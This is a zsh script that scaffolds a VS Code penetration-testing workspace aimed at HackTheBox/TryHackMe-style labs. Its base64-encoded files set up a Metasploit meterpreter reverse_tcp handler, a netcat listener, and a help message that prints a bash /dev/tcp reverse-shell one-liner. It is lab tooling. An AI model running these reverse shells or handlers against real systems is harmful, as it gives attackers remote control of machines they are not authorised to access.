#!/bin/zsh
# __        __                        __     ______   ____          _      
# \ \      / /__  __ _ _ __   ___  _ _\ \   / / ___| / ___|___   __| | ___ 
#  \ \ /\ / / _ \/ _` | '_ \ / _ \| '_ \ \ / /\___ \| |   / _ \ / _` |/ _ \
#   \ V  V /  __/ (_| | |_) | (_) | | | \ V /  ___) | |__| (_) | (_| |  __/
#    \_/\_/ \___|\__,_| .__/ \___/|_| |_|\_/  |____/ \____\___/ \__,_|\___|
#                    |_|                                                  
#
# Author: Esonhugh <weapon_vscode@eson.ninja>
# Path: createhackenv.sh
# Usage: createhackenv <foldername>
# Description: Create a hacking project with vscode based environment

weapon_vscode () {
	echo "Creating VSCode Hack Environment"
	echo "Usage: $0 <foldername>"
	if [ -z "$1" ]
	then
		echo "No folder name given"
		return 1
	fi
	mkdir -p $1/.vscode

    # .vscode/source_kali-orbstack.zsh
	echo 'ZXhwb3J0IFBST0pFQ1RfRk9MREVSPSR7UFdEfQpzb3VyY2UgLi8udnNjb2RlL2Vudi56c2gKCgpleGVjIHpzaCAtaSAgIyBtdXN0IGJlIHRoZXJlLiBvdGhlcndpc2UsIHRoZSB0ZXJtaW5hbCB3aWxsIGNsb3NlIGltbWVkaWF0ZWx5Lg==' | base64 -d > $1/.vscode/source_kali-orbstack.zsh

    # .vscode/settings.json
	echo 'ewogICAgInRlcm1pbmFsLmludGVncmF0ZWQucHJvZmlsZXMubGludXgiOiB7CiAgICAgICAgInpzaC1zaGVsbCI6IHsKICAgICAgICAgICAgImVudiI6IHsKICAgICAgICAgICAgICAgICJQUk9KRUNUX0ZPTERFUiI6ICIke3dvcmtzcGFjZUZvbGRlcn0iCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJwYXRoIjogInpzaCIsCiAgICAgICAgICAgICJhcmdzIjogWwogICAgICAgICAgICAgICAgIi1jIiwKICAgICAgICAgICAgICAgICJzb3VyY2UgJHt3b3Jrc3BhY2VGb2xkZXJ9Ly52c2NvZGUvc291cmNlLnpzaCIKICAgICAgICAgICAgXQogICAgICAgIH0sCiAgICAgICAgIm1ldGVycHJldGVyLWhhbmRsZXIiOiB7CiAgICAgICAgICAgICJvdmVycmlkZU5hbWUiOiB0cnVlLAogICAgICAgICAgICAiZW52IjogewogICAgICAgICAgICAgICAgIlBST0pFQ1RfRk9MREVSIjogIiR7d29ya3NwYWNlRm9sZGVyfSIsCiAgICAgICAgICAgICAgICAiTUVUQVNQTE9JVF9IQU5ETEVSX01PREUiOiAiVHJ1ZSIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgInBhdGgiOiAienNoIiwKICAgICAgICAgICAgImFyZ3MiOiBbCiAgICAgICAgICAgICAgICAiLWMiLAogICAgICAgICAgICAgICAgInNvdXJjZSAke3dvcmtzcGFjZUZvbGRlcn0vLnZzY29kZS9zb3VyY2UuenNoIgogICAgICAgICAgICBdCiAgICAgICAgfSwKICAgICAgICAibXNmY29uc29sZSI6IHsKICAgICAgICAgICAgIm92ZXJyaWRlTmFtZSI6IHRydWUsCiAgICAgICAgICAgICJlbnYiOiB7CiAgICAgICAgICAgICAgICAiUFJPSkVDVF9GT0xERVIiOiAiJHt3b3Jrc3BhY2VGb2xkZXJ9IiwKICAgICAgICAgICAgICAgICJNRVRBU1BMT0lUX0NPTlNPTEVfTU9ERSI6ICJUcnVlIgogICAgICAgICAgICB9LAogICAgICAgICAgICAicGF0aCI6ICJ6c2giLAogICAgICAgICAgICAiYXJncyI6IFsKICAgICAgICAgICAgICAgICItYyIsCiAgICAgICAgICAgICAgICAic291cmNlICR7d29ya3NwYWNlRm9sZGVyfS8udnNjb2RlL3NvdXJjZS56c2giCiAgICAgICAgICAgIF0KICAgICAgICB9LAogICAgICAgICJuZXRjYXQtaGFuZGxlciI6IHsKICAgICAgICAgICAgIm92ZXJyaWRlTmFtZSI6IHRydWUsCiAgICAgICAgICAgICJlbnYiOiB7CiAgICAgICAgICAgICAgICAiUFJPSkVDVF9GT0xERVIiOiAiJHt3b3Jrc3BhY2VGb2xkZXJ9IiwKICAgICAgICAgICAgICAgICJSRVZFUlNFX1NIRUxMX01PREUiOiAiVHJ1ZSIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgInBhdGgiOiAienNoIiwKICAgICAgICAgICAgImFyZ3MiOiBbCiAgICAgICAgICAgICAgICAiLWMiLAogICAgICAgICAgICAgICAgInNvdXJjZSAke3dvcmtzcGFjZUZvbGRlcn0vLnZzY29kZS9zb3VyY2UuenNoIgogICAgICAgICAgICBdCiAgICAgICAgfSwKICAgICAgICAid2ViLWRlbGl2ZXJ5IjogewogICAgICAgICAgICAib3ZlcnJpZGVOYW1lIjogdHJ1ZSwKICAgICAgICAgICAgImVudiI6IHsKICAgICAgICAgICAgICAgICJQUk9KRUNUX0ZPTERFUiI6ICIke3dvcmtzcGFjZUZvbGRlcn0iLAogICAgICAgICAgICAgICAgIldFQl9ERUxJVkVSWV9NT0RFIjogIlRydWUiCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJwYXRoIjogInpzaCIsCiAgICAgICAgICAgICJhcmdzIjogWwogICAgICAgICAgICAgICAgIi1jIiwKICAgICAgICAgICAgICAgICJzb3VyY2UgJHt3b3Jrc3BhY2VGb2xkZXJ9Ly52c2NvZGUvc291cmNlLnpzaCIKICAgICAgICAgICAgXQogICAgICAgIH0sCiAgICB9LAogICAgInRlcm1pbmFsLmludGVncmF0ZWQucHJvZmlsZXMub3N4IjogewogICAgICAgICJ6c2gtc2hlbGwiOiB7CiAgICAgICAgICAgICJlbnYiOiB7CiAgICAgICAgICAgICAgICAiUFJPSkVDVF9GT0xERVIiOiAiJHt3b3Jrc3BhY2VGb2xkZXJ9IgogICAgICAgICAgICB9LAogICAgICAgICAgICAicGF0aCI6ICJ6c2giLAogICAgICAgICAgICAiYXJncyI6IFsKICAgICAgICAgICAgICAgICItYyIsCiAgICAgICAgICAgICAgICAic291cmNlICR7d29ya3NwYWNlRm9sZGVyfS8udnNjb2RlL3NvdXJjZS56c2giCiAgICAgICAgICAgIF0KICAgICAgICB9LAogICAgICAgICJtZXRlcnByZXRlci1oYW5kbGVyIjogewogICAgICAgICAgICAib3ZlcnJpZGVOYW1lIjogdHJ1ZSwKICAgICAgICAgICAgImVudiI6IHsKICAgICAgICAgICAgICAgICJQUk9KRUNUX0ZPTERFUiI6ICIke3dvcmtzcGFjZUZvbGRlcn0iLAogICAgICAgICAgICAgICAgIk1FVEFTUExPSVRfSEFORExFUl9NT0RFIjogIlRydWUiCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJwYXRoIjogInpzaCIsCiAgICAgICAgICAgICJhcmdzIjogWwogICAgICAgICAgICAgICAgIi1jIiwKICAgICAgICAgICAgICAgICJzb3VyY2UgJHt3b3Jrc3BhY2VGb2xkZXJ9Ly52c2NvZGUvc291cmNlLnpzaCIKICAgICAgICAgICAgXQogICAgICAgIH0sCiAgICAgICAgIm1zZmNvbnNvbGUiOiB7CiAgICAgICAgICAgICJvdmVycmlkZU5hbWUiOiB0cnVlLAogICAgICAgICAgICAiZW52IjogewogICAgICAgICAgICAgICAgIlBST0pFQ1RfRk9MREVSIjogIiR7d29ya3NwYWNlRm9sZGVyfSIsCiAgICAgICAgICAgICAgICAiTUVUQVNQTE9JVF9DT05TT0xFX01PREUiOiAiVHJ1ZSIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgInBhdGgiOiAienNoIiwKICAgICAgICAgICAgImFyZ3MiOiBbCiAgICAgICAgICAgICAgICAiLWMiLAogICAgICAgICAgICAgICAgInNvdXJjZSAke3dvcmtzcGFjZUZvbGRlcn0vLnZzY29kZS9zb3VyY2UuenNoIgogICAgICAgICAgICBdCiAgICAgICAgfSwKICAgICAgICAibmV0Y2F0LWhhbmRsZXIiOiB7CiAgICAgICAgICAgICJvdmVycmlkZU5hbWUiOiB0cnVlLAogICAgICAgICAgICAiZW52IjogewogICAgICAgICAgICAgICAgIlBST0pFQ1RfRk9MREVSIjogIiR7d29ya3NwYWNlRm9sZGVyfSIsCiAgICAgICAgICAgICAgICAiUkVWRVJTRV9TSEVMTF9NT0RFIjogIlRydWUiCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJwYXRoIjogInpzaCIsCiAgICAgICAgICAgICJhcmdzIjogWwogICAgICAgICAgICAgICAgIi1jIiwKICAgICAgICAgICAgICAgICJzb3VyY2UgJHt3b3Jrc3BhY2VGb2xkZXJ9Ly52c2NvZGUvc291cmNlLnpzaCIKICAgICAgICAgICAgXQogICAgICAgIH0sCiAgICAgICAgIndlYi1kZWxpdmVyeSI6IHsKICAgICAgICAgICAgIm92ZXJyaWRlTmFtZSI6IHRydWUsCiAgICAgICAgICAgICJlbnYiOiB7CiAgICAgICAgICAgICAgICAiUFJPSkVDVF9GT0xERVIiOiAiJHt3b3Jrc3BhY2VGb2xkZXJ9IiwKICAgICAgICAgICAgICAgICJXRUJfREVMSVZFUllfTU9ERSI6ICJUcnVlIgogICAgICAgICAgICB9LAogICAgICAgICAgICAicGF0aCI6ICJ6c2giLAogICAgICAgICAgICAiYXJncyI6IFsKICAgICAgICAgICAgICAgICItYyIsCiAgICAgICAgICAgICAgICAic291cmNlICR7d29ya3NwYWNlRm9sZGVyfS8udnNjb2RlL3NvdXJjZS56c2giCiAgICAgICAgICAgIF0KICAgICAgICB9LAogICAgICAgICJrYWxpLW9yYnN0YWNrIjogewogICAgICAgICAgICAib3ZlcnJpZGVOYW1lIjogdHJ1ZSwKICAgICAgICAgICAgImVudiI6IHsKICAgICAgICAgICAgICAgICJQUk9KRUNUX0ZPTERFUiI6ICIke3dvcmtzcGFjZUZvbGRlcn0iCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJwYXRoIjogInpzaCIsCiAgICAgICAgICAgICJhcmdzIjogWwogICAgICAgICAgICAgICAgIi1jIiwKICAgICAgICAgICAgICAgICJvcmIgLXUgcm9vdCBzb3VyY2UgJHt3b3Jrc3BhY2VGb2xkZXJ9Ly52c2NvZGUvc291cmNlX2thbGktb3Jic3RhY2suenNoIgogICAgICAgICAgICBdCiAgICAgICAgfQogICAgfSwKICAgICJ0ZXJtaW5hbC5pbnRlZ3JhdGVkLmRlZmF1bHRQcm9maWxlLm9zeCI6ICJ6c2gtc2hlbGwiLAogICAgInRlcm1pbmFsLmludGVncmF0ZWQuZGVmYXVsdFByb2ZpbGUubGludXgiOiAienNoLXNoZWxsIiwKICAgICJ0ZXJtaW5hbC5pbnRlZ3JhdGVkLmF1dG9tYXRpb25Qcm9maWxlLm9zeCI6IHsKICAgICAgICAicGF0aCI6ICJ6c2giLAogICAgfSwKICAgICJ0ZXJtaW5hbC5pbnRlZ3JhdGVkLmF1dG9tYXRpb25Qcm9maWxlLmxpbnV4IjogewogICAgICAgICJwYXRoIjogInpzaCIsCiAgICB9LAogICAgImZpbGVzLmFzc29jaWF0aW9ucyI6IHsKICAgICAgICAiKi5udWNsZWkiOiAieWFtbCIKICAgIH0sCiAgICAieWFtbC5zY2hlbWFzIjogewogICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcHJvamVjdGRpc2NvdmVyeS9udWNsZWkvbWFpbi9udWNsZWktanNvbnNjaGVtYS5qc29uIjogIioubnVjbGVpIgogICAgfSwKfQ==' | base64 -d > $1/.vscode/settings.json

    # .vscode/source.zsh
	echo 'c291cmNlICR7UFJPSkVDVF9GT0xERVJ9Ly52c2NvZGUvZW52LnpzaAoKaWYgWyAiJFdFQl9ERUxJVkVSWV9NT0RFIiBdOyB0aGVuCiAgICBpZiBbIC16ICIkUFJPSkVDVF9XRUJfREVMSVZFUlkiIF07IHRoZW4KICAgICAgICBlY2hvICJQUk9KRUNUX1dFQl9ERUxJVkVSWSBpcyBub3Qgc2V0LiBQbGVhc2Ugc2V0IGl0IGluIC52c2NvZGUvZW52LnpzaCIKICAgIGVsc2UgCiAgICAgICAgaWYgWyAtZCAiJFBST0pFQ1RfV0VCX0RFTElWRVJZIiBdOyB0aGVuCiAgICAgICAgICAgIGVjaG8gIkZPTERFUiAkUFJPSkVDVF9XRUJfREVMSVZFUlkgZXhpc3RzLiIKICAgICAgICBlbHNlCiAgICAgICAgICAgIG1rZGlyIC1wICRQUk9KRUNUX1dFQl9ERUxJVkVSWQogICAgICAgICAgICBlY2hvICIqIiA+ICRQUk9KRUNUX1dFQl9ERUxJVkVSWS8uZ2l0aWdub3JlCiAgICAgICAgICAgIGVjaG8gIkZPTERFUiAkUFJPSkVDVF9XRUJfREVMSVZFUlkgY3JlYXRlZC4iCiAgICAgICAgZmkKICAgIGZpCiAgICBjZCAkUFJPSkVDVF9XRUJfREVMSVZFUlkKICAgIGV4cG9ydCBMSVNURU5fT049ODg5MAogICAgZWNobyAiIgogICAgZWNobyAiWU9VUiBJUDogJExIT1NUICIKICAgIGVjaG8gIllPVVIgVVJMOiBodHRwOi8vJExIT1NUOiRMSVNURU5fT04gIgogICAgZWNobyAiIgogICAgcHl0aG9uMyAtbSBodHRwLnNlcnZlciAkTElTVEVOX09OCiAgICBleGl0IDAKZmkgCgppZiBbICIkTUVUQVNQTE9JVF9IQU5ETEVSX01PREUiIF07IHRoZW4KICAgIG1zZmNvbnNvbGUgLXIgIiRQUk9KRUNUX0ZPTERFUi8udnNjb2RlL21ldGFzcGxvaXRfaGFuZGxlci5yYyIKICAgIGV4aXQgMApmaQoKaWYgWyAiJE1FVEFTUExPSVRfQ09OU09MRV9NT0RFIiBdOyB0aGVuIAogICAgbXNmY29uc29sZSAtciAiJFBST0pFQ1RfRk9MREVSLy52c2NvZGUvbXNmY29uc29sZS5yYyIKICAgIGV4aXQgMApmaQoKaWYgWyAiJFJFVkVSU0VfU0hFTExfTU9ERSIgXTsgdGhlbgogICAgZWNobyAiIgogICAgZWNobyAiWU9VUiBJUDogJExIT1NUIgogICAgZWNobyAiWU9VUiBSZXZlcnNlIFNoZWxsIFBvcnQ6ICRMUE9SVCIKICAgIGVjaG8gIkJhc2ljIFJldmVyc2hlbGwgQ29tbWFuZDogIgogICAgZWNobyAiICAvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvJHtMSE9TVH0vJHtMUE9SVH0gMD4mMSIKICAgIGVjaG8gIkFkdmFuY2VkOiAiCiAgICBlY2hvICIgIGh0dHBzOi8vcmV2LmVzb24ubmluamEvP2lwPSR7TEhPU1R9JnBvcnQ9JHtMUE9SVH0iCiAgICBlY2hvICIiCiAgICBybHdyYXAgLUkgLWNBciBuYyAtbHZ2cCAke0xQT1JUfQogICAgZXhpdCAwCmZpCgoKZXhlYyB6c2ggLWkgICMgbXVzdCBiZSB0aGVyZS4gb3RoZXJ3aXNlLCB0aGUgdGVybWluYWwgd2lsbCBjbG9zZSBpbW1lZGlhdGVseS4K' | base64 -d > $1/.vscode/source.zsh

    # .vscode/extensions.json
	echo 'ewogICAgInJlY29tbWVuZGF0aW9ucyI6IFsKICAgICAgICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCiAgICAgICAgLy8gTWFpbiBleHRlbnNpb25zCiAgICAgICAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwogICAgICAgIC8vIHJlbW90ZSBjb250cm9scwogICAgICAgICJtcy12c2NvZGUtcmVtb3RlLnJlbW90ZS1zc2giLCAvLyByZW1vdGUgc3NoIGNvbnRyb2xsZXIKICAgICAgICAibXMta3ViZXJuZXRlcy10b29scy52c2NvZGUta3ViZXJuZXRlcy10b29scyIsIC8vIEt1YmVybmV0ZXMgQ29udHJvbAogICAgICAgIAogICAgICAgIC8vIGRvY3VtZW50cyBhbmQgZmlsZSByZWFkIGhlbHBlcgogICAgICAgICJmb2FtLmZvYW0tdnNjb2RlIiwgLy8gZG91YmxlIGxpbmtlZCBrbm93bGVkZ2UgYmFzZSBmb3Igc2hvd2luZyB0aGUgcmVsYXRpb25zaGlwIGluIHRhcmdldHMgaW4gYWN0aW9ucwogICAgICAgICJyZWRoYXQudnNjb2RlLXlhbWwiLCAvLyB5YW1sIGZvcm1hdHRlcgogICAgICAgICJldXNrYWRpMzEuanNvbi1wcmV0dHktcHJpbnRlciIsIC8vIGpzb24gcHJldHR5IHByaW50ZXIKICAgICAgICAKICAgICAgICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCiAgICAgICAgLy8gTGFuZ3VhZ2Ugc3VwcG9ydHMKICAgICAgICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCiAgICAgICAgLy8gQyMKICAgICAgICAiaWNzaGFycGNvZGUuaWxzcHktdnNjb2RlIiwgLy8gYyMgZGVjb21waWxlcgogICAgICAgIC8vIFB5dGhvbgogICAgICAgICJtcy1weXRob24ucHl0aG9uIiwgLy8gbXMgcHl0aG9uIHN1cHBvcnRzCiAgICAgICAgImRvbmpheWFtYW5uZS5weXRob24tZW52aXJvbm1lbnQtbWFuYWdlciIsIC8vIHB5dGhvbiBlbnZpcm9ubWVudC9wYWNrYWdlcyBtYW5hZ2VyCiAgICAgICAgLy8gR29sYW5nCiAgICAgICAgImdvbGFuZy5nbyIsIC8vIGdvbGFuZyBzdXBwb3J0CgogICAgICAgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KICAgICAgICAvLyBQcm90b2NvbCBzdXBwb3J0cwogICAgICAgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KICAgICAgICAvLyBEYXRhYmFzZSBDb25uZWN0aW9ucwogICAgICAgIC8vICJhbGV4Y3Z6ei52c2NvZGUtc3FsaXRlIiwgLy8gc3FsaXRlIHN1cHBvcnQKICAgICAgICAvLwogICAgICAgIC8vIFByb3RvY29scwogICAgICAgIC8vICJycGRzd3RrLnZzbXF0dCIsIC8vIE1RVFQgc3VwcG9ydAogICAgICAgIC8vICJEYW5jaGVnOTcuZ3JwYy1jbGlja2VyIiwgLy8gZ1JQQyBzdXBwb3J0CiAgICAgICAgImN3ZWlqYW4udnNjb2RlLW9mZmljZSIsIC8vIGRvY3VtZW50cyBzdXBwb3J0ICsgaHR0cCByZXF1ZXN0IHNlbmRlcgoKICAgICAgICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCiAgICAgICAgLy8gQ3VzdG9tIEZhdm9yaXRlcwogICAgICAgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KICAgICAgICAidnNjb2RldmltLnZpbSIgLy8gdmltIG1vZGUgc3VwcG9ydAogICAgICAgIC8vICJtaHV0Y2hpZS5naXQtZ3JhcGgiLCAvLyBnaXQgZ3JhcGgKICAgIF0KfQ==' | base64 -d > $1/.vscode/extensions.json

    # .vscode/metasploit_handler.rc
	echo 'c2V0IFByb21wdCBbS25pZ2h0IE9wZXJhdGlvbiBDb25zb2xlXQpzZXQgTWV0ZXJwcmV0ZXJQcm9tcHQgW0tuaWdodCBFbmVteV0KCiMgY3VzdG9tIGZvciB5b3VyIGxvdmUKCnNldGcgcGF5bG9hZCB3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfdGNwCiMgc2V0ZyBSSE9TVFMgMTE0LjUuMS40Cgp1c2UgbXVsdGkvaGFuZGxlcgojIHNldCBwYXlsb2FkIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV90Y3AKc2V0IEV4aXRPblNlc3Npb24gZmFsc2UKc2V0IExIT1NUIDAuMC4wLjAgCnNldCBMUE9SVCA2Nzg5CgojIHVuY29tbWVudCB0aGlzIGZvciBBdXRvbWF0aWNhbGx5IGNyZWF0aW5nIGEgam9iIGxpc3RlbmVyIGJhY2tncm91bmQgd2l0aCBtdWx0aSBsaXN0ZW5lcnMKIyBydW4gLWoKIyBzZXQgcGF5bG9hZCBsaW51eC94NjQvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV90Y3AKIyBzZXQgTFBPUlQgNjc5MAojIAoKIyB1bmNvbW1lbnQgdGhpcyBmb3IgQXV0b21hdGljYWxseSBjcmVhdGluZyBhIGpvYiBsaXN0ZW5lciBiYWNrZ3JvdW5kCiMgcnVuIC1qIA==' | base64 -d > $1/.vscode/metasploit_handler.rc

    # .vscode/msfconsole.rc
	echo 'c2V0IFByb21wdCBbS25pZ2h0IE9wZXJhdGlvbiBDb25zb2xlXQpzZXQgTWV0ZXJwcmV0ZXJQcm9tcHQgW0tuaWdodCBFbmVteV0KCiMg' | base64 -d > $1/.vscode/msfconsole.rc

    # .vscode/tasks.json
	echo '' | base64 -d > $1/.vscode/tasks.json

    # .vscode/env.zsh
	echo 'IyBFTlYgc2V0dGluZ3MgZm9yIHRoZSBwcm9qZWN0CiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBQcm9qZWN0IHNldHRpbmdzIGZvciBac2ggUHJvbXB0CiMgZXhwb3J0IEhPU1Q9IltIYWNrVGhlQm94IC0gTWFjaGluZSBOYW1lXSIKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBUYXJnZXQgc2V0dGluZ3MKZXhwb3J0IFJIT1NUPTEwLjEwLlguWAojIHdvcmtzIHdlbGwgb24gSFRCIGFuZCBUSE0sIFB1dCB5b3VyIHJldmVyc2UgSVAgaGVyZS4KZXhwb3J0IExIT1NUPWBpZmNvbmZpZ3xncmVwICcxMFwuMTBcLid8Y3V0IC1kICcgJyAtZjJgCmV4cG9ydCBMUE9SVD02Nzg5CmV4cG9ydCBET01BSU49CgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgQWR2YW5jZWQgc2V0dGluZ3MKCiMgQVdTIHNldHRpbmdzCiMgZXhwb3J0IEFXU19ERUZBVUxUX1JFR0lPTj11cy13ZXN0LTIKIyBleHBvcnQgQVdTX0FDQ0VTU19LRVlfSUQ9QUtJQS4uLgojIGV4cG9ydCBBV1NfU0VDUkVUX0FDQ0VTU19LRVk9Li4uCiMgZXhwb3J0IEFXU19TRVNTSU9OX1RPS0VOPS4uLgojIGV4cG9ydCBBV1NfRU5EUE9JTlRfVVJMPQoKIyBWQVVMVCBzZXR0aW5ncwojIGV4cG9ydCBWQVVMVF9BRERSPQojIGV4cG9ydCBWQVVMVF9UT0tFTj0uLi4KCiMgTUlOSU8gc2V0dGluZ3MKIyBleHBvcnQgTUlOSU9fUk9PVF9VU0VSPS4uLiAjIGFjY2VzcyBrZXkKIyBleHBvcnQgTUlOSU9fUk9PVF9QQVNTV09SRD0uLi4gIyBzZWNyZXQga2V5CiMgZXhwb3J0IE1JTklPX0VORFBPSU5UPQojIGV4cG9ydCBNQ19IT1NUX215bWluaW89aHR0cDovLyR7TUlOSU9fUk9PVF9VU0VSfToke01JTklPX1JPT1RfUEFTU1dPUkR9QCR7TUlOSU9fRU5EUE9JTlR9CgojIFRlcnJhZm9ybSBzZXR0aW5ncwpleHBvcnQgVEZfTE9HPXRyYWNlCmV4cG9ydCBURl9MT0dfUEFUSD0kUFJPSkVDVF9GT0xERVIvdGVycmFmb3JtLmxvZwojIGV4cG9ydCBURl9WQVJfYXdzX2FjY2Vzc19rZXk9Li4uCiMgZXhwb3J0IFRGX1ZBUl9hd3Nfc2VjcmV0X2tleT0uLi4KIyBleHBvcnQgVEZfVkFSX2F3c19zZXNzaW9uX3Rva2VuPS4uLgojIGV4cG9ydCBURl9WQVJfYXdzX3JlZ2lvbj11cy13ZXN0LTIKCiMgT3BlblN0YWNrIHNldHRpbmdzCiMgZXhwb3J0IE9TX1VTRVJOQU1FPXVzZXJuYW1lCiMgZXhwb3J0IE9TX1BBU1NXT1JEPXBhc3N3b3JkCiMgZXhwb3J0IE9TX1RFTkFOVF9OQU1FPXByb2plY3ROYW1lCiMgZXhwb3J0IE9TX0FVVEhfVVJMPWh0dHBzOi8vaWRlbnRpdHlIb3N0OnBvcnROdW1iZXIvdjIKIyBUaGUgZm9sbG93aW5nIGxpbmVzIGNhbiBiZSBvbWl0dGVkCiMgZXhwb3J0IE9TX1RFTkFOVF9JRD10ZW5hbnRJRFN0cmluZwojIGV4cG9ydCBPU19SRUdJT05fTkFNRT1yZWdpb25OYW1lCiMgZXhwb3J0IE9TX0NBQ0VSVD0vcGF0aC90by9jYWNlcnRGaWxlCiMgZXhwb3J0IE9TX1RPS0VOPXRva2VuU3RyaW5nCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgTW9yZSBkZWZhdWx0IHNldHRpbmdzCmV4cG9ydCBUQVJHRVQ9JHtET01BSU46LSR7UkhPU1R9fSAjIHRhcmdldCBpcyB0YXJnZXQgaG9zdG5hbWUgaWYgbm90IHNldCB1c2UgUkhPU1QgaXAKCmV4cG9ydCBJUD0ke1JIT1NUfSAjIGFsaWFzIHJob3N0CmV4cG9ydCBpcD0ke0lQfSAjIGFsaWFzIGFzIElQCgpleHBvcnQgUFJPSkVDVF9XRUJfREVMSVZFUlk9JFBST0pFQ1RfRk9MREVSLy53ZWItZGVsaXZlcnkgIyB3ZWItZGVsaXZlcnkgaXMgYSBmb2xkZXIgaW4gUFJPSkVDVF9GT0xERVIKdW5zZXQgU1NTX0xPQURFRCAjIG1ha2Ugc3VyZSBzc3MgaW5pdCBzaGVsbCBpcyBub3Qgc2V0CgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgTmV0d29yayBzZXR0aW5ncyBjbGVhbiB1cCBhbmQgcmVzZXQKdW5zZXQgaHR0cHNfcHJveHkgaHR0cF9wcm94eSBhbGxfcHJveHkKIyBleHBvcnQgaHR0cF9wcm94eT0KIyBleHBvcnQgaHR0cHNfcHJveHk9CiMgZXhwb3J0IGFsbF9wcm94eT0KCiMgaWYgeW91IG5lZWQgdG8gc2V0IGZ1bmN0aW9ucyBkZWZpbml0aW9ucywgeW91IGNhbiBkbyBpdCBoZXJlCiMgc291cmNlICRQUk9KRUNUX0ZPTERFUi8udnNjb2RlL3V0aWxzLnpzaA==' | base64 -d > $1/.vscode/env.zsh

	echo "*" > $1/.vscode/.gitignore
    echo "!env.zsh" >> $1/.vscode/.gitignore
    echo "!metasploit_handler.rc" >> $1/.vscode/.gitignore
	echo "!msfconsole.rc" >> $1/.vscode/.gitignore
	echo "!revshell.zsh" >> $1/.vscode/.gitignore

	echo "Generate Success" "Launched VSCode"
	code $1
}

# Create Alias for weapon_vscode
alias createhackenv=weapon_vscode
alias createhack=weapon_vscode

# Script Hash: 35932668efe37dfc037d998dc600addce702a119776bdaec38e548b5cdc9632e
